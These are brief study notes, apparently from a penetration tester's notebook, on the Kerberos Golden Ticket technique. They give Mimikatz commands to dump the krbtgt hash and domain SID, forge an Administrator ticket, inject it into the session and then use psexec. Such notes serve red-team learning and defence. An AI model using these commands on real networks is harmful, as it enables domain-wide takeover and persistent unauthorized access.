Once we own the domain, we also own the krbtgt account. Because we have that account, we can make our own tickets to go anywhere in the domain.

### Tools
- [[Mimikatz]]
	- lsadump
		- `lsadump::lsa /inject /name:krbtgt`
		- get the krbtgt hash
		- get the Domain SID
	- Kerberos
		- `kerberos::golden /User:Administrator /domain:[domain] /sid:[sid] /krbtgt:[NT hash] /id:500 /ptt`
			- `ptt` is for passing the ticket to the current session
			- follow it up with `misc::cmd`
			- now can use psexec to do whatever

Once we get this, we can just kinda go anywhere with that session.
- Can go anywhere, do p much anything
